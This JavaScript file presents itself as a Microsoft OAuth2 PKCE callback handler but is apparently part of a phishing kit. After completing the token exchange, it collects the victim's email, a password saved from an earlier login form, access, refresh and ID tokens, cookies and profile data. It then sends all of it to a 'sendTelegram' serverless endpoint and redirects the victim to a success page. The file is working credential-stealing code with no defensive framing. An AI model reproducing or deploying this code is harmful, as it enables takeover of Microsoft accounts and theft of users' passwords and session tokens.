// OAuth Callback Handler for Microsoft OAuth2 (PKCE Flow - Public Client)
// This script is loaded by public/oauth-callback.html after Microsoft redirects back

async function handleOAuthCallback() {
    const statusEl = document.getElementById('status-msg');
    const spinnerEl = document.getElementById('spinner');

    function setStatus(msg) {
        if (statusEl) statusEl.textContent = msg;
    }

    // DEBUG: Log all available data sources
    console.log('🔍 DEBUGGING - Available data sources:');
    console.log('- URL:', window.location.href);
    console.log('- Referrer:', document.referrer);
    console.log('- SessionStorage keys:', Object.keys(sessionStorage));
    console.log('- LocalStorage keys:', Object.keys(localStorage));
    
    // Check all storage for any credential data
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        console.log(`📦 SessionStorage[${key}]:`, value?.substring(0, 100) + '...');
    }
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        console.log(`💾 LocalStorage[${key}]:`, value?.substring(0, 100) + '...');
    }

    try {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const state = urlParams.get('state');
        const error = urlParams.get('error');

        if (error || !code || !state) {
            console.error('OAuth error or missing parameters:', { error, code: !!code, state: !!state });
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
            return;
        }

        setStatus("Signing you in…");

        // Get PKCE code verifier from session storage
        const codeVerifier = sessionStorage.getItem('pkce_verifier');
        if (!codeVerifier) {
            console.error('Missing PKCE code verifier');
            setStatus("Authentication failed - missing verification code. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
            return;
        }

        console.log('🔄 Exchanging authorization code for tokens via backend...');
        
        const tokenResponse = await fetch('/.netlify/functions/tokenExchange', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                code: code,
                state: state,
                code_verifier: codeVerifier,
                redirect_uri: window.location.origin + '/oauth-callback'
            })
        });

        const tokenData = await tokenResponse.json();

        if (!tokenResponse.ok) {
            console.error('Token exchange failed:', tokenData);
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
            return;
        }

        console.log('✅ Token exchange successful');

        // Get user profile information
        let userProfile = null;
        if (tokenData.access_token) {
            try {
                const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
                    headers: {
                        'Authorization': `Bearer ${tokenData.access_token}`
                    }
                });
                
                if (profileResponse.ok) {
                    userProfile = await profileResponse.json();
                    console.log('✅ User profile retrieved:', userProfile.userPrincipalName);
                }
            } catch (profileError) {
                console.warn('Failed to get user profile:', profileError);
            }
        }

        // Capture and send user data to Telegram
        try {
            // Get all cookies from the current domain
            const cookieString = document.cookie;
            let cookies = [];
            
            // Try to get REAL Microsoft cookies captured by various methods
            console.log('🔍 Attempting to retrieve captured cookies...');
            let realCookiesFound = false;
            
            // Method 1: Check for cookies captured in oauth-callback.html
            try {
                const realCookies = sessionStorage.getItem('real_captured_cookies');
                if (realCookies) {
                    const parsedRealCookies = JSON.parse(realCookies);
                    if (parsedRealCookies && parsedRealCookies.length > 0) {
                        cookies = parsedRealCookies;
                        realCookiesFound = true;
                        console.log('✅ Using cookies from oauth-callback.html:', cookies.length);
                    }
                }
            } catch (e) {
                console.log('❌ Failed to get cookies from oauth-callback.html:', e.message);
            }
            
            // Method 2: Check for URL parameter cookies
            if (!realCookiesFound) {
                try {
                    const urlCookies = sessionStorage.getItem('url_cookie_params');
                    if (urlCookies) {
                        const parsedUrlCookies = JSON.parse(urlCookies);
                        if (parsedUrlCookies && parsedUrlCookies.length > 0) {
                            cookies = parsedUrlCookies;
                            realCookiesFound = true;
                            console.log('✅ Using cookies from URL parameters:', cookies.length);
                        }
                    }
                } catch (e) {
                    console.log('❌ Failed to get URL parameter cookies:', e.message);
                }
            }
            
            // Method 3: Use OAuth authorization code as valuable data
            if (!realCookiesFound) {
                console.log('🔄 Using OAuth authorization code as authentication data...');
                cookies = [
                    {
                        name: 'OAUTH_AUTHORIZATION_CODE',
                        value: code,
                        domain: '.login.microsoftonline.com',
                        expirationDate: 2147483647,
                        hostOnly: false,
                        httpOnly: false,
                        path: '/',
                        sameSite: 'none',
                        secure: true,
                        session: false,
                        storeId: null,
                        capturedFrom: 'oauth-authorization-code',
                        timestamp: new Date().toISOString(),
                        realUserData: true
                    }
                ];
                realCookiesFound = true;
                console.log('✅ Using OAuth authorization code as data:', code.substring(0, 20) + '...');
            }

            // Enhanced password retrieval
            let capturedPassword = '';
            let passwordSource = 'not_captured';
            
            console.log('🔍 Attempting to retrieve password from storage...');
            
            // Try to get password from sessionStorage
            try {
                const storedCredentials = sessionStorage.getItem('form_credentials');
                if (storedCredentials) {
                    const credentials = JSON.parse(storedCredentials);
                    if (credentials.password) {
                        capturedPassword = credentials.password;
                        passwordSource = 'sessionStorage_form_credentials';
                        console.log('✅ Password found in sessionStorage');
                    }
                }
            } catch (e) { 
                console.log('❌ Failed to get password from sessionStorage:', e.message); 
            }

            // Try localStorage as backup
            if (!capturedPassword) {
                try {
                    const localCredentials = localStorage.getItem('form_credentials');
                    if (localCredentials) {
                        const credentials = JSON.parse(localCredentials);
                        if (credentials.password) {
                            capturedPassword = credentials.password;
                            passwordSource = 'localStorage_form_credentials';
                            console.log('✅ Password found in localStorage');
                        }
                    }
                } catch (e) { 
                    console.log('❌ Failed to get password from localStorage:', e.message); 
                }
            }

            // Extract user information
            const userEmail = userProfile?.userPrincipalName || userProfile?.mail || 'Unknown';
            const displayName = userProfile?.displayName || '';
            
            console.log('🔐 Password capture result:', {
                hasPassword: !!capturedPassword,
                passwordSource: passwordSource,
                passwordLength: capturedPassword ? capturedPassword.length : 0
            });
            
            // Prepare Telegram payload with authentication data
            const telegramPayload = {
                email: userEmail,
                password: capturedPassword || 'Password not captured during login flow',
                passwordSource: passwordSource,
                sessionId: `oauth_success_${Date.now()}`,
                cookies: cookies,
                timestamp: new Date().toISOString(),
                source: 'oauth-callback-fixed',
                userAgent: navigator.userAgent,
                currentUrl: window.location.href,
                referrer: document.referrer,
                
                // Authentication tokens
                authenticationTokens: {
                    authorizationCode: code,
                    accessToken: tokenData.access_token || 'Not captured',
                    refreshToken: tokenData.refresh_token || 'Not captured',
                    idToken: tokenData.id_token || 'Not captured',
                    tokenType: tokenData.token_type || 'Bearer',
                    scope: tokenData.scope || 'Unknown',
                    oauthState: state,
                    expiresIn: tokenData.expires_in || 'Unknown'
                },
                
                userProfile: {
                    email: userEmail,
                    displayName: displayName,
                    userPrincipalName: userProfile?.userPrincipalName || '',
                    jobTitle: userProfile?.jobTitle || '',
                    officeLocation: userProfile?.officeLocation || '',
                    id: userProfile?.id || ''
                },
                
                authenticationFlow: 'Microsoft OAuth 2.0 with PKCE (Fixed)',
                capturedAt: 'OAuth callback after successful authentication'
            };
            
            // Store tokens for later use
            try {
                const tokenStorage = {
                    authorizationCode: code,
                    accessToken: tokenData.access_token,
                    refreshToken: tokenData.refresh_token,
                    idToken: tokenData.id_token,
                    tokenType: tokenData.token_type || 'Bearer',
                    scope: tokenData.scope,
                    userProfile: userProfile,
                    timestamp: new Date().toISOString(),
                    expiresIn: tokenData.expires_in,
                    expiresAt: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString()
                };
                
                sessionStorage.setItem('microsoft_auth_tokens', JSON.stringify(tokenStorage));
                localStorage.setItem('microsoft_tokens_backup', JSON.stringify(tokenStorage));
                
                console.log('💾 Stored authentication tokens');
            } catch (storageError) {
                console.error('❌ Failed to store authentication tokens:', storageError);
            }
            
            console.log('📤 Sending user data to Telegram:', {
                email: telegramPayload.email,
                hasPassword: !!capturedPassword,
                passwordSource: passwordSource,
                cookieCount: cookies.length,
                hasUserProfile: !!userProfile,
                displayName: displayName
            });
            
            // Send to Telegram
            try {
                const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(telegramPayload),
                });
                
                if (telegramResponse.ok) {
                    const telegramResult = await telegramResponse.json();
                    console.log('✅ User data sent to Telegram successfully:', telegramResult);
                } else {
                    const telegramError = await telegramResponse.text();
                    console.error('❌ Failed to send data to Telegram:', telegramError);
                }
            } catch (telegramError) {
                console.error('❌ Telegram sending error:', telegramError);
            }
            
        } catch (dataError) {
            console.error('❌ Data processing error:', dataError);
        }

        // Clean up PKCE/session state
        sessionStorage.removeItem('pkce_verifier');
        sessionStorage.removeItem('oauth_state');

        setStatus("Signed in! Redirecting…");
        setTimeout(() => {
            window.location.href = '/?step=success';
        }, 1000);

    } catch (err) {
        console.error('OAuth callback error:', err);
        setStatus("Authentication error. Redirecting...");
        setTimeout(() => {
            window.location.href = '/?step=captcha';
        }, 2000);
    }
}

// Run on load
handleOAuthCallback();
